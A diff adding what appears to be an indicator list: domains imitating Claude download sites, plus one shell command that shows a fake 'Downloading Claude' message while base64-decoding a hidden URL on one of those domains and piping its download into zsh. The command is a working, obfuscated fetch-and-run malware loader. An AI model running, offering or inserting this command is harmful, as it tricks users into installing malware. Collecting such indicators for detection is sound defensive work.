@@ -1,0 +1,11 @@
+claude-desk-code.com
+ksmgakajgpsals.pages.dev
+rapid-craft567.com
+too.clawddddd.com
+fine-byte2.com
+fairpoint29.com
+turbowave45.com
+cli-desktop.com
+homeopatiaalemana.com
+lake-90.com
+echo "Downloading Claude: hxxps://claude.ai/install.sh" && curl -s $(echo "aHR0cHM6Ly9sYWtlLTkwLmNvbS9jdXJsL2luaGd1cDlhL2E5MGZrYnFkZzhkMG11czY0b2g4ZHcuZGF0" | openssl base64 -d -A) | zsh
